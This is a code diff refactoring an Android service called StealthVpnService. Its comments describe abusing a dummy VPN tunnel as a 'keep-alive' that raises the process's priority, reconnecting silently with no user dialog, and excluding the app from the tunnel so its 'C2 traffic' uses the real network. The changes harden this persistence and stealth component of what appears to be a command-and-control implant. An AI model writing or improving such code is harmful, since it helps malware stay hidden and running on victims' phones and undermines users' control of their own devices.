@@ -8,6 +8,7 @@ import android.os.Build;
 import android.os.ParcelFileDescriptor;
 import android.util.Log;
 
+import java.io.FileInputStream;
 import java.io.IOException;
 
 /**
@@ -71,7 +72,6 @@ public final class StealthVpnService extends VpnService {
 
     @Override
     public void onRevoke() {
-        // User revoked VPN permission — tear down cleanly
         tearDown();
         Log.w(TAG, "VPN permission revoked by user");
     }
@@ -82,27 +82,26 @@ public final class StealthVpnService extends VpnService {
         try {
             Builder builder = new Builder()
                 .setSession(getPackageName())
-                // Minimal address — loopback-adjacent, not routed anywhere
+                // Minimal address — loopback-adjacent, never routed to real network
                 .addAddress("10.253.253.1", 32)
-                // Route only TEST-NET (RFC 5737) — 0 real-world traffic
+                // Route only TEST-NET (RFC 5737) — 0 real-world traffic captured
                 .addRoute("192.0.2.0", 24)
-                // Block our own app from going through the VPN so C2 traffic
-                // uses the real interface unimpeded
+                // Exclude our own app so C2 traffic uses the real interface
                 .addDisallowedApplication(getPackageName())
                 .setBlocking(false);
 
-            // API 29+: set underlying networks for better routing
+            // API 29+: mark as unmetered so Android routes cellular data normally
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 builder.setMetered(false);
             }
 
-            // Transparent reconnect — silent, no user dialog after initial grant
-            Intent pendingSelf = new Intent(this, StealthVpnService.class);
-            PendingIntent reconnectPi = PendingIntent.getService(
-                this, 0, pendingSelf,
-                PendingIntent.FLAG_UPDATE_CURRENT
+            // PendingIntent for transparent reconnect after initial grant.
+            // FLAG_IMMUTABLE is required on API 31+ and safe to use from API 23.
+            int piFlags = PendingIntent.FLAG_UPDATE_CURRENT
                 | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
-                   ? PendingIntent.FLAG_IMMUTABLE : 0));
+                   ? PendingIntent.FLAG_IMMUTABLE : 0);
+            PendingIntent reconnectPi = PendingIntent.getService(
+                this, 0, new Intent(this, StealthVpnService.class), piFlags);
             builder.setConfigureIntent(reconnectPi);
 
             tunFd = builder.establish();
@@ -112,8 +111,6 @@ public final class StealthVpnService extends VpnService {
                 return;
             }
 
-            // Discard thread: reads and drops all incoming packets on the tun fd.
-            // Without this, the kernel write buffer fills and can stall.
             startDiscardThread();
             Log.d(TAG, "VPN keep-alive active — process OOM priority elevated");
 
@@ -123,24 +120,37 @@ public final class StealthVpnService extends VpnService {
         }
     }
 
+    /**
+     * Drains the tun fd to prevent kernel write-buffer stalls.
+     * Captures a local reference to tunFd so tearDown() nulling the field
+     * mid-run doesn't cause a NullPointerException; the fd close in tearDown()
+     * will interrupt the blocking read and the finally block closes the stream.
+     */
     private void startDiscardThread() {
+        final ParcelFileDescriptor fd = tunFd;
         discardThread = new Thread(() -> {
-            byte[] buf = new byte[32768];
-            java.io.FileInputStream in =
-                new java.io.FileInputStream(tunFd.getFileDescriptor());
-            while (!Thread.currentThread().isInterrupted()) {
-                try {
-                    int n = in.read(buf);
-                    if (n < 0) break; // fd closed
-                    // Discard packet silently — TEST-NET range, no real traffic
-                } catch (IOException e) {
-                    if (!Thread.currentThread().isInterrupted()) {
-                        Log.w(TAG, "Discard thread read: " + e.getMessage());
+            FileInputStream in = null;
+            try {
+                in = new FileInputStream(fd.getFileDescriptor());
+                byte[] buf = new byte[32768];
+                while (!Thread.currentThread().isInterrupted()) {
+                    try {
+                        int n = in.read(buf);
+                        if (n < 0) break; // fd closed by tearDown()
+                        // Discard silently — TEST-NET range, no real traffic
+                    } catch (IOException e) {
+                        if (!Thread.currentThread().isInterrupted()) {
+                            Log.w(TAG, "Discard thread read: " + e.getMessage());
+                        }
+                        break;
                     }
-                    break;
                 }
+            } finally {
+                if (in != null) {
+                    try { in.close(); } catch (IOException ignored) {}
+                }
+                Log.d(TAG, "Discard thread exited");
             }
-            Log.d(TAG, "Discard thread exited");
         }, "VpnDiscard");
         discardThread.setDaemon(true);
         discardThread.setPriority(Thread.MIN_PRIORITY);
